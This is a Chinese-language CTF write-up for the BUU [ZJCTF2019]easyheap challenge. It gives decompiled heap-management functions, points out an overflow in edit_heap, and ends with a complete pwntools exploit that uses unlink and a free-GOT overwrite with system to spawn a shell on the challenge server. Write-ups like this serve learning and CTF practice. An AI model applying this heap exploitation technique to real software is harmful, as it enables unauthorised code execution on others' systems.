# BUU-[ZJCTF2019]easyheap

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## IDA

**create**

```c
unsigned __int64 create_heap()
{
  int i; // [rsp+4h] [rbp-1Ch]
  size_t size; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  for ( i = 0; i <= 9; ++i )
  {
    if ( !*(&heaparray + i) )
    {
      printf("Size of Heap : ");
      read(0, buf, 8uLL);
      size = atoi(buf);
      *(&heaparray + i) = malloc(size);
      if ( !*(&heaparray + i) )
      {
        puts("Allocate Error");
        exit(2);
      }
      printf("Content of heap:");
      read_input(*(&heaparray + i), size);
      puts("SuccessFul");
      return __readfsqword(0x28u) ^ v4;
    }
  }
  return __readfsqword(0x28u) ^ v4;
}
```

**edit**

```c
unsigned __int64 edit_heap()
{
  int v1; // [rsp+4h] [rbp-1Ch]
  __int64 v2; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&heaparray + v1) )
  {
    printf("Size of Heap : ");
    read(0, buf, 8uLL);
    v2 = atoi(buf);
    printf("Content of heap : ");
    read_input(*(&heaparray + v1), v2);
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v4;
}
```

**delete**

```c
unsigned __int64 delete_heap()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&heaparray + v1) )
  {
    free(*(&heaparray + v1));
    *(&heaparray + v1) = 0LL;
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

使用`heaparray`维护了一个堆指针数组，在`edit_heap`中可以写任意字节，有溢出。`delete`时，将指针进行了销毁，没有UAF。

想到使用`unlink`改写数组指针。由于BUU环境与原题不一样所有没办法使用`magic`直接打印flag，使用修改got表的方法。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, addr))
context.log_level="DEBUG"
#context.arch="amd64"

local=0
binary='./easyheap'
#gdb.attach(sh)
if local:
	sh=process(binary)
else:
	sh=remote('node3.buuoj.cn',29537)

elf = ELF(binary,checksec=False)
#libc = ELF('./libc-2.271.so')
system_plt = elf.plt["system"]
free_got = elf.got["free"]

def add(size,content):
    sh.sendline("1")
    sh.sendafter('Size of Heap : ', str(size))
    sh.sendafter('Content of heap:', str(content))
    
def edit(index, size, content):    
    sh.sendline("2")
    sh.sendafter("Index :", str(index))
    sh.sendafter('Size of Heap : ', str(size))
    sh.sendafter('Content of heap : ', str(content))
    
def free(index):
    sh.sendline("3")
    sh.sendafter("Index :", str(index))      
    
heap_arry = 0x6020E0
magic = 0x6020C0

add(0x100,'a'*0x100) #0
add(0x100,'b'*0x100) #1
add(0x10,"/bin/sh\x00\x00\x00")   #2

payload = p64(0)+p64(0x100)+p64(heap_arry-0x18)+p64(heap_arry-0x10)
payload=payload.ljust(0x100,'a')
payload+=p64(0x100)+p64(0x110)
edit(0, 0x110, payload)
free(1)
#gdb.attach(sh)
payload = p64(0)+p64(free_got)+p64(free_got)+p64(free_got)
edit(0,len(payload),payload)
payload= p64(system_plt)+p64(system_plt)
edit(0,len(payload),payload)

free(2)
#add(0x10,'c'*0x10)
sh.interactive()
```

